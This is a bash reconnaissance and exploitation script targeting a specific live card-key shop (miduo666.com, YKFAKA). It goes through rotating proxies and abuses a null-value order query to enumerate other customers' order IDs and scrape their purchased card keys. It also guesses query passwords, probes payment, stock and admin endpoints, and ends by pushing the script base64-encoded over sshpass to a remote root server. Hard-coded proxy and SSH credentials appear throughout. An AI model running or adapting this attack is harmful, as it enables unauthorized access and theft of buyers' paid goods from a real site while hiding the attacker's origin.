#!/bin/bash
# miduo666.com — YKFAKA; SUCCESS_CASES mima1314 null→Query_Km first
set -u
PROXY_URL=""
KEY=C413ED6D; PW=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://miduo666.com
OUT=/tmp/miduo666_out; CK=/tmp/miduo666.ck; LOG=/tmp/miduo666_recon.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception: print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PW}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 8 --max-time 35 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }

for i in 1 2 3 4 5 6 7 8; do
  refresh
  code=$(curl -sk --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo '===== DNS / fingerprint ====='
getent hosts miduo666.com || true
python3 - <<'PY'
import re
h=open('/tmp/miduo666_out/home.html',encoding='utf-8',errors='ignore').read()
print('len',len(h))
print('title', (re.search(r'<title>([^<]+)',h) or type('x',(),{'group':lambda*a:None})()).group(1))
for pat in [r'YKFAKA', r'author[^>]+', r'Get_Yk_KC', r'Query_Km', r'Query\.html', r'ThinkPHP', r'assets/faka', r'USDT', r't\.me/[A-Za-z0-9_]+', r'@[A-Za-z0-9_]{4,}', r'T[1-9A-HJ-NP-Za-km-z]{33}']:
    ms=re.findall(pat,h,re.I)
    if ms: print(pat,'=>',list(dict.fromkeys([m if isinstance(m,str) else m[0] for m in ms]))[:10])
# version meta
print('metas', re.findall(r'<meta[^>]+>',h)[:15])
PY

echo '===== SUCCESS mima1314: value=null Query.html ====='
# step1 get Query.html token
c "$BASE/Query.html" -o "$OUT/query.html" -w 'Query:%{http_code}\n'
python3 - <<'PY'
import re
h=open('/tmp/miduo666_out/query.html',encoding='utf-8',errors='ignore').read()
print('len',len(h))
toks=re.findall(r'name="__token__"[^>]*value="([^"]+)"',h)
if not toks: toks=re.findall(r'__token__["\']?\s*[:=]\s*["\']([^"\']+)',h)
print('tokens',toks[:3])
open('/tmp/miduo666_out/token.txt','w').write(toks[0] if toks else '')
print('geetest', bool(re.search(r'geetest|captcha',h,re.I)))
print('hints', re.findall(r'.{0,20}(订单|查询|密码|token|验证).{0,40}',h)[:8])
PY
TOKEN=$(cat "$OUT/token.txt")
echo TOKEN=$TOKEN

# POST null like mima1314
refresh
c -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H "Referer: $BASE/Query.html" \
  --data "value=null&page=1&__token__=$TOKEN" \
  "$BASE/Query.html" -o "$OUT/null_p1.html" -w 'NULL_POST:%{http_code} size:%{size_download}\n'

python3 - <<'PY'
import re
h=open('/tmp/miduo666_out/null_p1.html',encoding='utf-8',errors='ignore').read()
print('len',len(h))
# Query_Km links
kms=re.findall(r'Query_Km/([0-9a-fA-F]{8,32})', h)
print('Query_Km links',len(kms),'unique',len(set(kms)))
if kms:
  open('/tmp/miduo666_out/ddids.txt','w').write('\n'.join(dict.fromkeys(kms)))
  print('sample', list(dict.fromkeys(kms))[:10])
# also other patterns
print('ddid attrs', re.findall(r'ddid["\']?\s*[:=]\s*["\']([0-9a-fA-F]+)',h)[:10])
print('order links', re.findall(r'href=["\']([^"\']*Query[^"\']*)',h)[:15])
# error messages
for pat in ['验证','密码','失败','错误','次数','token','非法','空']:
  if pat in h: print('contains',pat)
print('snip', re.sub(r'\s+',' ',h)[:500])
PY

# try page=2+
if [[ -f "$OUT/ddids.txt" ]]; then
  echo '===== page2 null ====='
  TOKEN2=$(python3 -c "import re;h=open('/tmp/miduo666_out/null_p1.html',encoding='utf-8',errors='ignore').read();m=re.search(r'name=\"__token__\"[^>]*value=\"([^\"]+)\"',h);print(m.group(1) if m else open('/tmp/miduo666_out/token.txt').read())")
  c -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H "Referer: $BASE/Query.html" \
    --data "value=null&page=2&__token__=$TOKEN2" \
    "$BASE/Query.html" -o "$OUT/null_p2.html" -w 'NULL_P2:%{http_code} size:%{size_download}\n'
  python3 - <<'PY'
import re
h=open('/tmp/miduo666_out/null_p2.html',encoding='utf-8',errors='ignore').read()
kms=re.findall(r'Query_Km/([0-9a-fA-F]{8,32})', h)
print('page2 kms',len(kms),list(dict.fromkeys(kms))[:5])
PY
fi

echo '===== pull Query_Km samples ====='
if [[ -f "$OUT/ddids.txt" ]]; then
  head -15 "$OUT/ddids.txt" | while read -r ddid; do
    [[ -z "$ddid" ]] && continue
    code=$(c -H "Referer: $BASE/Query.html" "$BASE/Query_Km/$ddid" -o "$OUT/km_$ddid.html" -w '%{http_code}')
    python3 - <<PY
import re
h=open('/tmp/miduo666_out/km_$ddid.html',encoding='utf-8',errors='ignore').read()
# card-like content
print('km ddid=$ddid HTTP=$code len',len(h))
for pat in [r'卡密', r'密码', r'未付款', r'无此', r'失败', r'textarea', r'kami', r'----']:
  if re.search(pat,h,re.I): print(' ',pat,'yes')
# extract possible cards
tas=re.findall(r'<textarea[^>]*>(.*?)</textarea>',h,re.S|re.I)
pre=re.findall(r'<pre[^>]*>(.*?)</pre>',h,re.S|re.I)
if tas: print(' textarea',tas[0][:200].replace('\n','|')); open('/tmp/miduo666_out/cards.txt','a').write(tas[0].strip()+'\n')
if pre: print(' pre',pre[0][:200].replace('\n','|'))
# content divs
for m in re.finditer(r'class="[^"]*(?:kami|card|content|km)[^"]*"[^>]*>([^<]{5,120})',h,re.I):
  print(' field',m.group(1)[:100])
PY
  done
else
  echo 'no ddids from null — try Query_Km rate / random'
  for ddid in 000000000001 deadbeefcafe aaaaaaaaaaaa 123456789abc; do
    code=$(c -H "Referer: $BASE/Query.html" "$BASE/Query_Km/$ddid" -o "$OUT/km_$ddid.html" -w '%{http_code}')
    body=$(head -c 180 "$OUT/km_$ddid.html" | tr '\n' ' ')
    echo "km $ddid => HTTP$code $body"
  done
fi

echo '===== SUCCESS qd93/79yj (expect N/A) ====='
for u in "$BASE/?mod=query&data=1" "$BASE/shop/" "$BASE/ajax.php?act=getcount" "$BASE/api.php?act=siteinfo"; do
  echo "$u => $(curl -sk --max-time 12 -x "$PROXY_URL" -A "$UA" -o /dev/null -w '%{http_code}' "$u")"
done

echo '===== stock Get_Yk_KC ====='
# scrape gids from home
python3 - <<'PY'
import re
h=open('/tmp/miduo666_out/home.html',encoding='utf-8',errors='ignore').read()
gids=re.findall(r'gid[=:]["\']?(\d+)',h,re.I)
gids+=re.findall(r'/goods[/\w]*?(\d+)',h,re.I)
gids+=re.findall(r'data-id=["\'](\d+)',h)
print('gids',sorted(set(gids),key=lambda x:int(x))[:40])
open('/tmp/miduo666_out/gids.txt','w').write('\n'.join(sorted(set(gids),key=lambda x:int(x))[:80]))
# product links
print('links', re.findall(r'href=["\']([^"\']+)["\']',h)[:30])
PY
# also try common Trade pages
for path in /Trade.html /trade.html /Goods.html /List.html /index/index /user/login; do
  echo "$path => $(c -o /dev/null -w '%{http_code}' "$BASE$path")"
done

# Get_Yk_KC for gids 1-20 + discovered
{ cat "$OUT/gids.txt" 2>/dev/null; seq 1 20; } | awk 'NF && !seen[$0]++' | head -40 | while read -r gid; do
  body=$(c "$BASE/Get_Yk_KC.html?gid=$gid")
  echo "KC gid=$gid => ${body:0:160}"
done

echo '===== Pay surface ====='
c "$BASE/Pay" -o "$OUT/pay_get.html" -w 'PayGET:%{http_code}\n' || true
# try POST variants
for pt in udpay alipay wxpay qqpay usdt; do
  body=$(c -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
    --data "gid=1&paytype=$pt&num=1" "$BASE/Pay" | head -c 200 | tr '\n' ' ')
  echo "Pay $pt => $body"
done

echo '===== Query password / other ====='
# default pass hint pages
python3 - <<'PY'
import re
h=open('/tmp/miduo666_out/query.html',encoding='utf-8',errors='ignore').read()
print('pass hints', re.findall(r'.{0,30}(默认|密码|Ykfaka|token).{0,50}',h,re.I)[:15])
print('forms', re.findall(r'<form[^>]*>.*?</form>',h,re.S|re.I)[:2])
PY

# try value= empty / 1 / admin
c "$BASE/Query.html" -o "$OUT/query2.html" >/dev/null
TOKEN=$(python3 -c "import re;h=open('/tmp/miduo666_out/query2.html',encoding='utf-8',errors='ignore').read();m=re.search(r'name=\"__token__\"[^>]*value=\"([^\"]+)\"',h);print(m.group(1) if m else '')")
for val in '' '1' 'null' 'undefined' 'admin' 'Ykfaka999'; do
  code=$(c -X POST -H 'Content-Type: application/x-www-form-urlencoded' -H "Referer: $BASE/Query.html" \
    --data-urlencode "value=$val" --data "page=1&__token__=$TOKEN" \
    "$BASE/Query.html" -o "$OUT/qval.html" -w '%{http_code}')
  VAL="$val" CODE="$code" python3 - <<'PY'
import re,os
h=open('/tmp/miduo666_out/qval.html',encoding='utf-8',errors='ignore').read()
kms=re.findall(r'Query_Km/([0-9a-fA-F]{8,32})', h)
val=os.environ.get('VAL',''); code=os.environ.get('CODE','')
print(f'value=[{val}] HTTP={code} len={len(h)} kms={len(kms)} empty_hint={"无" in h or "没有" in h or "失败" in h}')
PY
done

echo '===== admin/install ====='
for u in "$BASE/admin/" "$BASE/Admin/" "$BASE/install/" "$BASE/Install/" "$BASE/user/login" "$BASE/Login.html"; do
  echo "$u => $(curl -sk --max-time 12 -x "$PROXY_URL" -A "$UA" -o /dev/null -w '%{http_code}' "$u")"
done

echo '===== RECON DONE ====='
ls -la "$OUT" | head -40
if [[ -f "$OUT/cards.txt" ]]; then echo CARDS; cat "$OUT/cards.txt"; fi
if [[ -f "$OUT/ddids.txt" ]]; then echo DDIDS=$(wc -l <"$OUT/ddids.txt"); head -20 "$OUT/ddids.txt"; fi
EOF
chmod +x /workspace/miduo666/scripts/miduo666_recon.sh
# upload run
B64=$(base64 -w0 /workspace/miduo666/scripts/miduo666_recon.sh)
for i in 1 2 3 4; do
  sshpass -p 'UzHlZQDUy7XP' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=25 root@124.248.67.170 \
    "echo '$B64' | base64 -d > /tmp/miduo666_recon.sh && chmod +x /tmp/miduo666_recon.sh && bash /tmp/miduo666_recon.sh" \
    2>&1 | tee /workspace/miduo666/results/recon.log | tail -160 && break
  echo RETRY=$i; sleep $((4*i))
done